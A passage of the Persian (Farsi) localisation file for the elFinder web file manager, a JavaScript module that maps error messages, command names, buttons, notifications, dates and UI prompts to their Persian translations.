/**
 * فارسی translation
 * @author Keyhan Mohammadpour <keyhan_universityworks@yahoo.com>
 * @author Farhad Zare <farhad@persianoc.com>
 * @version 2022-02-28
 */
 (function(root, factory) {
	if (typeof define === 'function' && define.amd) {
		define(['elfinder'], factory);
	} else if (typeof exports !== 'undefined') {
		module.exports = factory(require('elfinder'));
	} else {
		factory(root.elFinder);
	}
}(this, function(elFinder) {
	elFinder.prototype.i18.fa = {
		translator : 'Keyhan Mohammadpour &lt;keyhan_universityworks@yahoo.com&gt;, Farhad Zare &lt;farhad@persianoc.com&gt;',
		language   : 'فارسی',
		direction  : 'rtl',
		dateFormat : 'd.m.Y H:i', // will show like: 28.02.2022 15:41
		fancyDateFormat : '$1 H:i', // will show like: امروز 15:41
		nonameDateFormat : 'ymd-His', // noname upload will show like: 220228-154144
		messages   : {
			'getShareText' : 'اشتراک گذاری',
			'Editor ': 'ویرایشگر کد',
			/********************************** errors **********************************/
			'error'                : 'خطا',
			'errUnknown'           : 'خطای ناشناخته.',
			'errUnknownCmd'        : 'دستور ناشناخته.',
			'errJqui'              : 'تنظیمات کتابخانه JQuery UI شما به درستی انجام نشده است. این کتابخانه بایستی شامل Resizable ،Draggable و Droppable باشد.',
			'errNode'              : 'elfinder به درستی ایجاد نشده است.',
			'errURL'               : 'تنظیمات elfinder شما به درستی انجام نشده است. تنظیم Url را اصلاح نمایید.',
			'errAccess'            : 'محدودیت سطح دسترسی',
			'errConnect'           : 'امکان اتصال به مدیریت وجود ندارد.',
			'errAbort'             : 'ارتباط قطع شده است.',
			'errTimeout'           : 'مهلت زمانی ارتباط شما به اتمام رسیده است.',
			'errNotFound'          : 'تنظیم مدیریت یافت نشد.',
			'errResponse'          : 'پاسخ دریافتی از مدیریت صحیح نمی باشد.',
			'errConf'              : 'تنطیمات مدیریت به درستی انجام نشده است.',
			'errJSON'              : 'ماژول PHP JSON نصب نیست.',
			'errNoVolumes'         : 'درایوهای قابل خواندن یافت نشدند.',
			'errCmdParams'         : 'پارامترهای دستور "$1" به صورت صحیح ارسال نشده است.',
			'errDataNotJSON'       : 'داده ها در قالب JSON نمی باشند.',
			'errDataEmpty'         : 'داده دریافتی خالی است.',
			'errCmdReq'            : 'درخواست از سمت مدیریت نیازمند نام دستور می باشد.',
			'errOpen'              : 'امکان باز نمودن "$1" وجود ندارد.',
			'errNotFolder'         : 'آیتم موردنظر پوشه نیست.',
			'errNotFile'           : 'آیتم موردنظر فایل نیست.',
			'errRead'              : 'امکان خواندن "$1" وجود ندارد.',
			'errWrite'             : 'امکان نوشتن در درون "$1" وجود ندارد.',
			'errPerm'              : 'شما مجاز به انجام این عمل نمی باشید.',
			'errLocked'            : '"$1" قفل گردیده است و شما قادر به تغییر نام ، حذف و یا جابجایی آن نمی باشید.',
			'errExists'            : 'فایلی با نام "$1" هم اکنون وجود دارد.',
			'errInvName'           : 'نام انتخابی شما صحیح نمی باشد.',
			'errInvDirname'        : 'نام پوشه غیرمعتبر می باشد.',  // from v2.1.24 added 12.4.2017
			'errFolderNotFound'    : 'پوشه مورد نظر یافت نشد.',
			'errFileNotFound'      : 'فایل مورد نظر یافت نشد.',
			'errTrgFolderNotFound' : 'پوشه مقصد با نام "$1" یافت نشد.',
			'errPopup'             : 'مرورگر شما ار باز شدن پنجره popup جلوگیری می کند، لطفا تنظیمات مربوطه را در مرورگر خود فعال نمایید.',
			'errMkdir'             : 'امکان ایجاد پوشه ای با نام "$1" وجود ندارد.',
			'errMkfile'            : 'امکان ایجاد فایلی با نام "$1" وجود ندارد.',
			'errRename'            : 'امکان تغییر نام فایل "$1" وجود ندارد.',
			'errCopyFrom'          : 'کپی نمودن از درایو با نام "$1" ممکن نمی باشد.',
			'errCopyTo'            : 'کپی نمودن به درایو با نام "$1" ممکن نمی باشد.',
			'errMkOutLink'         : 'امکان ایجاد لینک به خارج از مسیر ریشه وجود ندارد.', // from v2.1 added 03.10.2015
			'errUpload'            : 'خطای آپلود',  // old name - errUploadCommon
			'errUploadFile'        : 'امکان آپلود "$1" وجود ندارد.', // old name - errUpload
			'errUploadNoFiles'     : 'فایلی برای آپلود یافت نشد.',
			'errUploadTotalSize'   : 'حجم داده بیش از حد مجاز می باشد.', // old name - errMaxSize
			'errUploadFileSize'    : 'حجم فایل بیش از حد مجاز می باشد.', //  old name - errFileMaxSize
			'errUploadMime'        : 'نوع فایل انتخابی مجاز نمی باشد.',
			'errUploadTransfer'    : 'در انتقال "$1" خطایی رخ داده است.',
			'errUploadTemp'        : 'امکان ایجاد فایل موقت جهت آپلود وجود ندارد.', // from v2.1 added 26.09.2015
			'errNotReplace'        : 'آیتم "$1" از قبل وجود دارد و امکان جایگزینی آن با آیتمی از نوع دیگر وجود ندارد.', // new
			'errReplace'           : 'امکان جایگزینی "$1" وجود ندارد.',
			'errSave'              : 'امکان ذخیره کردن "$1" وجود ندارد.',
			'errCopy'              : 'امکان کپی کردن "$1" وجود ندارد.',
			'errMove'              : 'امکان جابجایی "$1" وجود ندارد.',
			'errCopyInItself'      : 'امکان کپی کردن "$1" در درون خودش وجود ندارد.',
			'errRm'                : 'امکان حذف کردن "$1" وجود ندارد.',
			'errTrash'             : 'امکان حذف وجود ندارد.', // from v2.1.24 added 30.4.2017
			'errRmSrc'             : 'امکان حذف فایل(ها) از مبدا وجود ندارد.',
			'errExtract'           : 'امکان استخراج فایل فشرده "$1" وجود ندارد.',
			'errArchive'           : 'امکان ایجاد فایل فشرده وجود ندارد.',
			'errArcType'           : 'نوع ناشناخته برای فایل فشرده.',
			'errNoArchive'         : 'این فایل فشرده نیست یا اینکه این نوع فایل فشرده پشتیبانی نمی شود.',
			'errCmdNoSupport'      : 'مدیریت از این دستور پشتیبانی نمی کند.',
			'errReplByChild'       : 'امکان جایگزینی پوشه "$1" با یک آیتم از درون خودش وجود ندارد.',
			'errArcSymlinks'       : 'به دلایل مسائل امنیتی امکان باز کردن فایل فشرده دارای symlinks وجود ندارد.', // edited 24.06.2012
			'errArcMaxSize'        : 'فایل های فشرده به حداکثر اندازه تعیین شده رسیده اند.',
			'errResize'            : 'امکان تغییر اندازه "$1" وجود ندارد.',
			'errResizeDegree'      : 'درجه چرخش نامعتبر است.',  // added 7.3.2013
			'errResizeRotate'      : 'امکان چرخش تصویر وجود ندارد.',  // added 7.3.2013
			'errResizeSize'        : 'اندازه تصویر نامعتبر است.',  // added 7.3.2013
			'errResizeNoChange'    : 'تغییری در اندازه تصویر ایجاد نشده است.',  // added 7.3.2013
			'errUsupportType'      : 'این نوع فایل پشتیبانی نمی شود.',
			'errNotUTF8Content'    : 'فایل "$1" به صورت UTF-8 ذخیره نشده و امکان ویرایش آن وجود ندارد.',  // added 9.11.2011
			'errNetMount'          : 'امکان اتصال "$1" وجود ندارد.', // added 17.04.2012
			'errNetMountNoDriver'  : 'این پروتکل پشتیبانی نمی شود.',     // added 17.04.2012
			'errNetMountFailed'    : 'اتصال ناموفق بود.',         // added 17.04.2012
			'errNetMountHostReq'   : 'میزبان موردنیاز است.', // added 18.04.2012
			'errSessionExpires'    : 'اعتبار جلسه کاری شما بدلیل عدم فعالیت برای مدت زمان طولانی به اتمام رسیده است.',
			'errCreatingTempDir'   : 'امکان ایجاد دایرکتوری موقت وجود ندارد: "$1"',
			'errFtpDownloadFile'   : 'امکان دریافت فایل از FTP وجود ندارد: "$1"',
			'errFtpUploadFile'     : 'امکان آپلود فایل به FTP وجود ندارد: "$1"',
			'errFtpMkdir'          : 'امکان ایجاد دایرکتوری برروی FTP وجود ندارد: "$1"',
			'errArchiveExec'       : 'خطا در زمان فشرده سازی این فایل‌ها: "$1"',
			'errExtractExec'       : 'خطا در زمان بازگشایی این فایل‌ها: "$1"',
			'errNetUnMount'        : 'امکان قطع اتصال وجود ندارد.', // from v2.1 added 30.04.2012
			'errConvUTF8'          : 'امکان تبدیل به UTF-8 وجود ندارد', // from v2.1 added 08.04.2014
			'errFolderUpload'      : 'جهت آپلود کردن پوشه، از یک مرورگر مدرن استفاده نمایید.', // from v2.1 added 26.6.2015
			'errSearchTimeout'     : 'در هنگان جستجو برای "$1" خطایی رخ داده است. نتیجه جستجو به صورت ناتمام می باشد.', // from v2.1 added 12.1.2016
			'errReauthRequire'     : 'اعتبارسنجی مجدد موردنیاز است.', // from v2.1.10 added 24.3.2016
			'errMaxTargets'        : 'حداکثر تعداد انتخاب قابل قبول $1 می‌باشد.', // from v2.1.17 added 17.10.2016
			'errRestore'           : 'امکان بازیابی وجود ندارد. مقصد بازیابی نامشخص است.', // from v2.1.24 added 3.5.2017
			'errEditorNotFound'    : 'ویرایشگری برای این نوع فایل یافت نشد.', // from v2.1.25 added 23.5.2017
			'errServerError'       : 'خطایی در سمت سرور به وجود آمده است.', // from v2.1.25 added 16.6.2017
			'errEmpty'             : 'امکان خالی کردن پوشه "$1" وجود ندارد.', // from v2.1.25 added 22.6.2017
			'moreErrors'           : '$1 خطای دیگر نیز وجود دارد.', // from v2.1.44 added 9.12.2018
			'errMaxMkdirs'         : 'شما می توانید تا $1 پوشه در یک زمان ایجاد کنید.', // from v2.1.58 added 20.6.2021

			/******************************* commands names ********************************/
			'cmdarchive'   : 'ایجاد فایل فشرده',
			'cmdback'      : 'بازگشت به عقب',
			'cmdcopy'      : 'کپی',
			'cmdcut'       : 'بریدن',
			'cmddownload'  : 'دانلود',
			'cmdduplicate' : 'تکثیر فایل',
			'cmdedit'      : 'ویرایش محتوای فایل',
			'cmdextract'   : 'بازگشایی فایل فشرده',
			'cmdforward'   : 'حرکت به جلو',
			'cmdgetfile'   : 'انتخاب فایل‌ها',
			'cmdhelp'      : 'درباره این نرم‌افزار',
			'cmdhome'      : 'ریشه',
			'cmdinfo'      : 'مشاهده مشخصات',
			'cmdmkdir'     : 'پوشه جدید',
			'cmdmkdirin'   : 'انتقال به پوشه جدید', // from v2.1.7 added 19.2.2016
			'cmdmkfile'    : 'فایل جدید',
			'cmdopen'      : 'باز کردن',
			'cmdpaste'     : 'چسباندن',
			'cmdquicklook' : 'پیش نمایش',
			'cmdreload'    : 'بارگذاری مجدد',
			'cmdrename'    : 'تغییر نام',
			'cmdrm'        : 'حذف',
			'cmdtrash'     : 'انتقال به سطل بازیافت', //from v2.1.24 added 29.4.2017
			'cmdrestore'   : 'بازیابی', //from v2.1.24 added 3.5.2017
			'cmdsearch'    : 'جستجوی فایل',
			'cmdup'        : 'رفتن به سطح بالاتر',
			'cmdupload'    : 'آپلود فایل',
			'cmdview'      : 'مشاهده',
			'cmdresize'    : 'تغییر اندازه و چرخش',
			'cmdsort'      : 'مرتب سازی',
			'cmdnetmount'  : 'اتصال درایو شبکه', // added 18.04.2012
			'cmdnetunmount': 'قطع اتصال', // from v2.1 added 30.04.2012
			'cmdplaces'    : 'به مسیرهای', // added 28.12.2014
			'cmdchmod'     : 'تغییر حالت', // from v2.1 added 20.6.2015
			'cmdopendir'   : 'بازکردن یک پوشه', // from v2.1 added 13.1.2016
			'cmdcolwidth'  : 'بازنشانی عرض ستون', // from v2.1.13 added 12.06.2016
			'cmdfullscreen': 'حالت نمایش تمام صفحه', // from v2.1.15 added 03.08.2016
			'cmdmove'      : 'انتقال', // from v2.1.15 added 21.08.2016
			'cmdempty'     : 'خالی کردن پوشه', // from v2.1.25 added 22.06.2017
			'cmdundo'      : 'خنثی‌سازی', // from v2.1.27 added 31.07.2017
			'cmdredo'      : 'انجام مجدد', // from v2.1.27 added 31.07.2017
			'cmdpreference': 'تنظیمات', // from v2.1.27 added 03.08.2017
			'cmdselectall' : 'انتخاب همه موارد', // from v2.1.28 added 15.08.2017
			'cmdselectnone': 'لغو انتخاب', // from v2.1.28 added 15.08.2017
			'cmdselectinvert': 'انتخاب معکوس', // from v2.1.28 added 15.08.2017
			'cmdopennew'   : 'باز کردن در پنجره جدید', // from v2.1.38 added 3.4.2018
			'cmdhide'      : 'مخفی (پیشنهادی)', // from v2.1.41 added 24.7.2018

			/*********************************** buttons ***********************************/
			'btnClose'  : 'بستن',
			'btnSave'   : 'ذخیره',
			'btnRm'     : 'حذف',
			'btnApply'  : 'اعمال',
			'btnCancel' : 'انصراف',
			'btnNo'     : 'خیر',
			'btnYes'    : 'بلی',
			'btnMount'  : 'اتصال',  // added 18.04.2012
			'btnApprove': 'رفتن به $1 و تایید', // from v2.1 added 26.04.2012
			'btnUnmount': 'قطع اتصال', // from v2.1 added 30.04.2012
			'btnConv'   : 'تبدیل', // from v2.1 added 08.04.2014
			'btnCwd'    : 'اینجا',      // from v2.1 added 22.5.2015
			'btnVolume' : 'درایو',    // from v2.1 added 22.5.2015
			'btnAll'    : 'همه',       // from v2.1 added 22.5.2015
			'btnMime'   : 'نوع فایل', // from v2.1 added 22.5.2015
			'btnFileName':'نام فایل',  // from v2.1 added 22.5.2015
			'btnSaveClose': 'ذخیره و بستن', // from v2.1 added 12.6.2015
			'btnBackup' : 'پشتیبان‌گیری', // fromv2.1 added 28.11.2015
			'btnRename'    : 'تغییر نام',      // from v2.1.24 added 6.4.2017
			'btnRenameAll' : 'تغییر نام(همه)', // from v2.1.24 added 6.4.2017
			'btnPrevious' : 'قبلی ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnNext'     : 'بعدی ($1/$2)', // from v2.1.24 added 11.5.2017
			'btnSaveAs'   : 'ذخیره با نام جدید', // from v2.1.25 added 24.5.2017

			/******************************** notifications ********************************/
			'ntfopen'     : 'در حال باز کردن پوشه',
			'ntffile'     : 'در حال باز کردن فایل',
			'ntfreload'   : 'بارگذاری مجدد محتویات پوشه',
			'ntfmkdir'    : 'در حال ایجاد پوشه',
			'ntfmkfile'   : 'در حال ایجاد فایل',
			'ntfrm'       : 'در حال حذف موارد موردنظر',
			'ntfcopy'     : 'در حال کپی موارد موردنظر',
			'ntfmove'     : 'در حال انتقال موارد موردنظر',
			'ntfprepare'  : 'بررسی موارد موجود',
			'ntfrename'   : 'در حال تغییر نام فایل',
			'ntfupload'   : 'در حال آپلود فایل',
			'ntfdownload' : 'در حال دانلود فایل',
			'ntfsave'     : 'در حال ذخیره فایل',
			'ntfarchive'  : 'در حال ایجاد فایل فشرده',
			'ntfextract'  : 'در حال استخراج فایل ها از حالت فشرده',
			'ntfsearch'   : 'در حال جستجوی فایل',
			'ntfresize'   : 'در حال تغییر اندازه تصاویر',
			'ntfsmth'     : 'درحال انجام عملیات ....',
			'ntfloadimg'  : 'در حال بارگذاری تصویر',
			'ntfnetmount' : 'در حال اتصال درایو شبکه', // added 18.04.2012
			'ntfnetunmount': 'قطع اتصال درایو شبکه', // from v2.1 added 30.04.2012
			'ntfdim'      : 'در حال محاسبه ابعاد تصویر', // added 20.05.2013
			'ntfreaddir'  : 'در حال دریافت مشخصات پوشه', // from v2.1 added 01.07.2013
			'ntfurl'      : 'در حال دریافت URL', // from v2.1 added 11.03.2014
			'ntfchmod'    : 'در حال تغییر نوع فایل', // from v2.1 added 20.6.2015
			'ntfpreupload': 'در حال تایید نام فایل جهت آپلود', // from v2.1 added 31.11.2015
			'ntfzipdl'    : 'در حال ایجاد فایل جهت دانلود', // from v2.1.7 added 23.1.2016
			'ntfparents'  : 'در حال دریافت اطلاعات مسیر', // from v2.1.17 added 2.11.2016
			'ntfchunkmerge': 'در حال پردازش فایل آپلود شده', // from v2.1.17 added 2.11.2016
			'ntftrash'    : 'در حال انتقال به سطل بازیافت', // from v2.1.24 added 2.5.2017
			'ntfrestore'  : 'در حال بازیابی از سطل بازیافت', // from v2.1.24 added 3.5.2017
			'ntfchkdir'   : 'بررسی پوشه مقصد', // from v2.1.24 added 3.5.2017
			'ntfundo'     : 'در حال خنثی‌سازی آخرین عملیات', // from v2.1.27 added 31.07.2017
			'ntfredo'     : 'در حال انجام مجدد آخرین عملیات', // from v2.1.27 added 31.07.2017
			'ntfchkcontent' : 'در حال بررسی مطالب', // from v2.1.41 added 3.8.2018

			/*********************************** volumes *********************************/
			'volume_Trash' : 'سطل بازیافت', //from v2.1.24 added 29.4.2017

			/************************************ dates **********************************/
			'dateUnknown' : 'نامعلوم',
			'Today'       : 'امروز',
			'Yesterday'   : 'دیروز',
			'msJan'       : 'ژانویه',
			'msFeb'       : 'فوریه',
			'msMar'       : 'مارس',
			'msApr'       : 'آوریل',
			'msMay'       : 'می',
			'msJun'       : 'جون',
			'msJul'       : 'جولای',
			'msAug'       : 'آگوست',
			'msSep'       : 'سپتامبر',
			'msOct'       : 'اکتبر',
			'msNov'       : 'نوامبر',
			'msDec'       : 'دسامبر',
			'January'     : 'ژانویه',
			'February'    : 'فوریه',
			'March'       : 'مارس',
			'April'       : 'آوریل',
			'May'         : 'می',
			'June'        : 'جون',
			'July'        : 'جولای',
			'August'      : 'آگوست',
			'September'   : 'سپتامبر',
			'October'     : 'اکتبر',
			'November'    : 'نوامبر',
			'December'    : 'دسامبر',
			'Sunday'      : 'یک‌شنبه',
			'Monday'      : 'دوشنبه',
			'Tuesday'     : 'سه‌شنبه',
			'Wednesday'   : 'چهارشنبه',
			'Thursday'    : 'پنج‌شنبه',
			'Friday'      : 'جمعه',
			'Saturday'    : 'شنبه',
			'Sun'         : 'یک‌شنبه',
			'Mon'         : 'دوشنبه',
			'Tue'         : 'سه‌شنبه',
			'Wed'         : 'چهارشنبه',
			'Thu'         : 'پنج‌شنبه',
			'Fri'         : 'جمعه',
			'Sat'         : 'شنبه',

			/******************************** sort variants ********************************/
			'sortname'          : 'بر اساس نام',
			'sortkind'          : 'بر اساس نوع',
			'sortsize'          : 'بر اساس اندازه',
			'sortdate'          : 'بر اساس تاریخ',
			'sortFoldersFirst'  : 'پوشه‌ها در ابتدای لیست',
			'sortperm'          : 'براساس سطح دسترسی', // from v2.1.13 added 13.06.2016
			'sortmode'          : 'براساس مد دسترسی',       // from v2.1.13 added 13.06.2016
			'sortowner'         : 'براساس مالک',      // from v2.1.13 added 13.06.2016
			'sortgroup'         : 'براساس گروه',      // from v2.1.13 added 13.06.2016
			'sortAlsoTreeview'  : 'همچنین نمای درختی',  // from v2.1.15 added 01.08.2016

			/********************************** new items **********************************/
			'untitled file.txt' : 'فایل.txt جدید', // added 10.11.2015
			'untitled folder'   : 'پوشه جدید',   // added 10.11.2015
			'Archive'           : 'بایگانی جدید',  // from v2.1 added 10.11.2015
			'untitled file'     : 'فایل جدید.$1',  // from v2.1.41 added 6.8.2018
			'extentionfile'     : '$1: فایل',    // from v2.1.41 added 6.8.2018
			'extentiontype'     : '$1: $2',      // from v2.1.43 added 17.10.2018

			/********************************** messages **********************************/
			'confirmReq'      : 'تایید نهایی عملیات ضروری است.',
			'confirmRm'       : 'آیا مطمئنید که موارد انتخابی حذف شوند؟ موارد حدف شده قابل بازیابی نخواهند بود!',
			'confirmRepl'     : 'مالیلد جایگزینی فایل قدیمی با فایل جدید انجام شود؟ (برای جایگزینی پوشه محتوای قدیمی با محتوای پوشه جدید ادغام خواهد شد. برای تهیه پشتیبانی و سپس جایگزینی گزینه پشتیبان‌گیری را انتخاب نمایید)',
			'confirmRest'     : 'آیا مایلید موارد موجود با موارد بازیابی شده از سطل بازیافت جایگزین شود؟', // fromv2.1.24 added 5.5.2017
			'confirmConvUTF8' : 'UTF-8 نیست<br/>تبدیل به UTF-8 انجام شود؟<br/>پس از ذخیره سازی محتوا به صورت UTF-8 خواهد بود.', // from v2.1 added 08.04.2014
			'confirmNonUTF8'  : 'encoding این فایل قابل تشخیص نیست. جهت ویرایش نیاز است که به صورت موقت به UTF-8 تبدیل شود.<br/>لطفا encoding فایل را انتخاب نمایید.', // from v2.1.19 added 28.11.2016
			'confirmNotSave'  : 'تغییراتی اعمال شده است.<br/>در صورت عدم ذخیره تغییرات از بین خواهد رفت.', // from v2.1 added 15.7.2015
			'confirmTrash'    : 'آیا مطمئنید که این موارد به سطل بازیافت منتقل شوند؟', //from v2.1.24 added 29.4.2017
			'confirmMove'     : 'آیا مطمئن هستید که می خواهید موارد را به "$1" منتقل کنید؟', //from v2.1.50 added 27.7.2019
			'apllyAll'        : 'اعمال تغییرات به همه موارد',
			'name'            : 'نام',
			'size'            : 'اندازه',
			'perms'           : 'سطح دسترسی',
			'modify'          : 'آخرین تغییرات',
			'kind'            : 'نوع',
			'read'            : 'خواندن',
			'write'           : 'نوشتن',
			'noaccess'        : 'دسترسی وجود ندارد',
			'and'             : 'و',
			'unknown'         : 'نامعلوم',
			'selectall'       : 'انتخاب همه موارد',
			'selectfiles'     : 'انتخاب یک یا چند مورد',
			'selectffile'     : 'انتخاب اولین مورد',
			'selectlfile'     : 'انتخاب آخرین مورد',
			'viewlist'        : 'حالت نمایش لیست',
			'viewicons'       : 'نمایش با آیکون',
			'viewSmall'       : 'آیکون‌های کوچک', // from v2.1.39 added 22.5.2018
			'viewMedium'      : 'آیکون‌های متوسط', // from v2.1.39 added 22.5.2018
			'viewLarge'       : 'آیکون‌های بزرگ', // from v2.1.39 added 22.5.2018
			'viewExtraLarge'  : 'آیکون‌های خیلی بزرگ', // from v2.1.39 added 22.5.2018
			'places'          : 'مسیرها',
			'calc'            : 'محاسبه',
			'path'            : 'مسیر',
			'aliasfor'        : 'نام مستعار برای',
			'locked'          : 'قفل شده',
			'dim'             : 'ابعاد',
			'files'           : 'فایل‌ها',
			'folders'         : 'پوشه‌ها',
			'items'           : 'آیتم‌ها',
			'yes'             : 'بلی',
			'no'              : 'خیر',
			'link'            : 'لینک',
			'searcresult'     : 'نتایج جستجو',
			'selected'        : 'موارد انتخاب شده',
			'about'           : 'درباره',
			'shortcuts'       : 'میانبرها',
			'help'            : 'راهنمایی',
			'webfm'           : 'مدیر فایل تحت وب',
			'ver'             : 'نسخه',
			'protocolver'     : 'نسخه پروتکل',
			'homepage'        : 'صفحه اصلی پروژه',
			'docs'            : 'مستندات',
			'github'          : 'صفحه پروژه را در Github مشاهده کنید',
			'twitter'         : 'ما را در Twitter دنبال کنید',
			'facebook'        : 'به ما در facebook ملحق شوید',
			'team'            : 'تیم',
			'chiefdev'        : 'توسعه دهنده اصلی',
			'developer'       : 'توسعه دهنده',
			'contributor'     : 'مشارکت کننده',
			'maintainer'      : 'پشتیبان',
			'translator'      : 'مترجم',
			'icons'           : 'آیکون‌ها',
			'dontforget'      : 'و فراموش نکنید که حوله خود را بردارید',
			'shortcutsof'     : 'میانبرها غیرفعال شده‌اند.',
			'dropFiles'       : 'فایل ها در این بخش رها کنید.',
			'or'              : 'یا',
			'selectForUpload' : 'انتخاب فایل جهت آپلود',
			'moveFiles'       : 'انتقال موارد',
			'copyFiles'       : 'کپی موارد',
			'restoreFiles'    : 'بازیابی موارد', // from v2.1.24 added 5.5.2017
			'rmFromPlaces'    : 'حذف',
			'aspectRatio'     : 'نسبت تصویر',
			'scale'           : 'مقیاس',
			'width'           : 'طول',
			'height'          : 'ارتفاع',
			'resize'          : 'تغییر اندازه',
			'crop'            : 'بریدن',
			'rotate'          : 'چرخاندن',
			'rotate-cw'       : 'چرخاندن 90 درجه در جهت عقربه‌های ساعت',
			'rotate-ccw'      : 'چرخاندن 90 درجه در جهت خلاف عقربه‌های ساعت',
			'degree'          : '°',
			'netMountDialogTitle' : 'اتصال درایو شبکه', // added 18.04.2012
			'protocol'            : 'پروتکل', // added 18.04.2012
			'host'                : 'میزبان', // added 18.04.2012
			'port'                : 'پورت', // added 18.04.2012
			'user'                : 'نام کاربری', // added 18.04.2012
			'pass'                : 'کلمه عبور', // added 18.04.2012
			'confirmUnmount'      : 'مطمئن به قطع اتصال $1 می باشد؟',  // from v2.1 added 30.04.2012
			'dropFilesBrowser': 'فایل‌ها را به داخل این کادر بیندازید یا از حافظه paste کنید', // from v2.1 added 30.05.2012
			'dropPasteFiles'  : 'فایل‌ها را به داخل این کادر بیندازید یا از داخل حافظه آدرس URL/تصاویر را paste کنید', // from v2.1 added 07.04.2014
			'encoding'        : 'نوع کد گذاری', // from v2.1 added 19.12.2014
			'locale'          : 'نوع Locale',   // from v2.1 added 19.12.2014
			'searchTarget'    : 'مقصد: $1',                // from v2.1 added 22.5.2015
			'searchMime'      : 'جستجو براساس MIME Type وارد شده', // from v2.1 added 22.5.2015
			'owner'           : 'مالک', // from v2.1 added 20.6.2015
			'group'           : 'گروه', // from v2.1 added 20.6.2015
			'other'           : 'سایر', // from v2.1 added 20.6.2015
			'execute'         : 'قابل اجرا', // from v2.1 added 20.6.2015
			'perm'            : 'سطح دسترسی', // from v2.1 added 20.6.2015
			'mode'            : 'مد دسترسی', // from v2.1 added 20.6.2015
			'emptyFolder'     : 'پوشه خالی است', // from v2.1.6 added 30.12.2015
			'emptyFolderDrop' : 'پوشه خالی است، فایل‌ها را جهت افزودن کشیده و رها کنید', // from v2.1.6 added 30.12.2015
			'emptyFolderLTap' : 'پوشه خالی است، یک اشاره طولانی برای افزودن فایل کافی است', // from v2.1.6 added 30.12.2015
			'quality'         : 'کیفیت', // from v2.1.6 added 5.1.2016
			'autoSync'        : 'همگام‌سازی خودکار',  // from v2.1.6 added 10.1.2016
			'moveUp'          : 'حرکت به بالا',  // from v2.1.6 added 18.1.2016
			'getLink'         : 'دریافت URL لینک', // from v2.1.7 added 9.2.2016
			'selectedItems'   : 'موارد انتخاب شده ($1)', // from v2.1.7 added 2.19.2016
			'folderId'        : 'شناسه پوشه', // from v2.1.10 added 3.25.2016
			'offlineAccess'   : 'اجازه دسترسی به صورت آفلاین', // from v2.1.10 added 3.25.2016
			'reAuth'          : 'جهت اعتبارسنجی مجدد', // from v2.1.10 added 3.25.2016
			'nowLoading'      : 'در حال بازگذاری...', // from v2.1.12 added 4.26.2016
			'openMulti'       : 'بازکردن چندین فایل', // from v2.1.12 added 5.14.2016
			'openMultiConfirm': 'شما قصد باز کردن $1 فایل را دارید. آیا مایلید همه موارد در مرورگر باز شود؟', // from v2.1.12 added 5.14.2016
			'emptySearch'     : 'موردی یافت نشد.', // from v2.1.12 added 5.16.2016
			'editingFile'     : 'در حال ویرایش یک فایل.', // from v2.1.13 added 6.3.2016
			'hasSelected'     : 'شما $1 مورد را انتخاب کرده‌اید.', // from v2.1.13 added 6.3.2016
			'hasClipboard'    : 'در حافظه $1 مورد وجود دارد.', // from v2.1.13 added 6.3.2016
			'incSearchOnly'   : 'جستجوی افزایش فقط از نمای فعلی.', // from v2.1.13 added 6.30.2016
			'reinstate'       : 'بازگرداندن', // from v2.1.15 added 3.8.2016
			'complete'        : 'عملیات $1 انجام شد', // from v2.1.15 added 21.8.2016
			'contextmenu'     : 'منو راست', // from v2.1.15 added 9.9.2016
			'pageTurning'     : 'چرخش صفحه', // from v2.1.15 added 10.9.2016
			'volumeRoots'     : 'ریشه‌های درایو', // from v2.1.16 added 16.9.2016
			'reset'           : 'بازنشانی', // from v2.1.16 added 1.10.2016
			'bgcolor'         : 'رنگ پس زمینه', // from v2.1.16 added 1.10.2016
			'colorPicker'     : 'انتخابگر رنگ', // from v2.1.16 added 1.10.2016
			'8pxgrid'         : 'گرید 8px', // from v2.1.16 added 4.10.2016
			'enabled'         : 'فعال شده', // from v2.1.16 added 4.10.2016
			'disabled'        : 'غیرفعال شده', // from v2.1.16 added 4.10.2016
			'emptyIncSearch'  : 'در نمای فعلی موردی یافت نشد.\\Aبا فشردن کلید Enter مسیر جستجو را تغییر دهید.', // from v2.1.16 added 5.10.2016
			'emptyLetSearch'  : 'برای جستجوی تک حرفی در نمایش فعلی موردی یافت نشد.', // from v2.1.23 added 24.3.2017
			'textLabel'       : 'عنوان متنی', // from v2.1.17 added 13.10.2016
			'minsLeft'        : '$1 دقیقه باقیمانده', // from v2.1.17 added 13.11.2016
			'openAsEncoding'  : 'باز کردن مجدد با کد گذاری انتخاب شده', // from v2.1.19 added 2.12.2016
			'saveAsEncoding'  : 'ذخیره با کد گذاری انتخاب شده', // from v2.1.19 added 2.12.2016
			'selectFolder'    : 'انتخاب پوشه', // from v2.1.20 added 13.12.2016
			'firstLetterSearch': 'جستجوی تک حرفی', // from v2.1.23 added 24.3.2017
			'presets'         : 'از پیش تعیین شده', // from v2.1.25 added 26.5.2017
			'tooManyToTrash'  : 'موارد زیاد است و امکان انتقال به سطل بازیافت وجود ندارد.', // from v2.1.25 added 9.6.2017
			'TextArea'        : 'ویرایش محتوا', // from v2.1.25 added 14.6.2017
			'folderToEmpty'   : 'خالی کردن پوشه "$1".', // from v2.1.25 added 22.6.2017
			'filderIsEmpty'   : 'پوشه "$1" ‌ذاتا خالی است.', // from v2.1.25 added 22.6.2017
			'preference'      : 'تنظیمات', // from v2.1.26 added 28.6.2017
			'language'        : 'زبان', // from v2.1.26 added 28.6.2017
			'clearBrowserData': 'بازبینی تنظیمات ذخیره شده در این مرورگر', // from v2.1.26 added 28.6.2017
			'toolbarPref'     : 'تنظیمات نوار ابزار', // from v2.1.27 added 2.8.2017
			'charsLeft'       : '... $1 کاراکتر باقیمانده.',  // from v2.1.29 added 30.8.2017
			'linesLeft'       : '$1 خط مانده است',  // from v2.1.52 added 16.1.2020
			'sum'             : 'مجموع', // from v2.1.29 added 28.9.2017
			'roughFileSize'   : 'اندازه فایل نامتعارف', // from v2.1.30 added 2.11.2017
			'autoFocusDialog' : 'انتخاب عناصر داخل دیالوگ با mouseover',  // from v2.1.30 added 2.11.2017
			'select'          : 'انتخاب', // from v2.1.30 added 23.11.2017
			'selectAction'    : 'عملیات به هنگام انتخاب فایل', // from v2.1.30 added 23.11.2017
			'useStoredEditor' : 'باز کردن با ویرایشگر مورداستفاده در آخرین دفعه', // from v2.1.30 added 23.11.2017
			'selectinvert'    : 'انتخاب معکوس', // from v2.1.30 added 25.11.2017
			'renameMultiple'  : 'آیا مایل به تغییر نام $1 مورد انتخاب شده همانند $2 هستید؟<br/>امکان بازگرداندن این تغییر پس از اعمالو جود ندارد!', // from v2.1.31 added 4.12.2017
